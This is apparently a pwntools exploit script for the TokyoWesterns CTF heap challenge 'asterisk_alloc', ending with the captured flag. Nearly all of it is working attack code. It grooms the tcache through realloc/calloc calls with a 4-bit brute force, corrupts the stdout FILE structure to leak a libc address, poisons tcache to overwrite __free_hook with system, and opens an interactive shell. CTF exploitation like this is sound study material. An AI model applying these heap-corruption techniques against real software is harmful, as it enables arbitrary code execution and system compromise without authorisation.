from pwn import *
import sys

# context.log_level = 'debug'
if len(sys.argv) >= 2:
    p = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
else:
    p = process("./asterisk_alloc")
    pause()

def fnsend(ch, sz, da):
    p.recvuntil("choice: ")
    p.sendline(str(ch))
    p.recvuntil("Size: ")
    p.sendline(str(sz))
    p.recvuntil("Data: ")
    p.send(da)

def fnfree(op):
    p.recvuntil("choice: ")
    p.sendline('4')
    p.recvuntil("Which: ")
    p.sendline(op)

fnsend(3, 0xf0, 'B')
fnsend(3, 0xb0, 'B')
fnfree('r')
fnfree('r')
fnfree('r')
fnfree('r')
fnfree('r')
fnsend(3, 0x1b0, 'B')
fnfree('r')
fnfree('r')
fnfree('r')
fnsend(3, 0xf0, 'C')
fnfree('r')
fnsend(3, 0x200, 'C')
fnsend(3, 0x100, 'C')
fnsend(3, 0, '')
fnsend(3, 0xb0, 'B')
fnfree('r')
fnsend(3, 0, '')

z = ''
z += 'A'*0xf8
z += p64(0xc1)
z += '\x60\x37' # \xdd' # <--  4 bit bruteforce
pause()
fnsend(3, 0x1b0, z)
fnsend(3, 0, '')

fnsend(3, 0xb0, 'A')
z = p64(0x800)+"\x00"*0x9
fnsend(1, 0xb0, p64(0xfbad3c80) + p64(0)*3 + "\x00")

p.recv(8)
libcleak = u64(p.recv(8))
libcbase = libcleak - 0x3ed8b0
log.info("%#x", libcbase)

fnsend(3, 0, '')

fnsend(3, 0x30, 'A')
fnfree('r')
fnfree('r')
fnsend(3, 0x10, p64(libcbase + 0x3ed8e8))
fnfree('r')
fnfree('r')
fnfree('r')
fnfree('r')
fnfree('r')
fnfree('r')
fnsend(3, 0, '')

fnsend(2, 0x10, p64(libcbase + 0x3ed8e8 - 8))

fnsend(3, 0x30, 'A')
fnsend(3, 0x10, '/bin/sh')
fnsend(3, 0, '')
fnsend(3, 0x30, "/bin/sh\x00" + p64(libcbase + 0x4f440))

p.interactive()

# TWCTF{malloc_&_realloc_&_calloc_with_tcache}
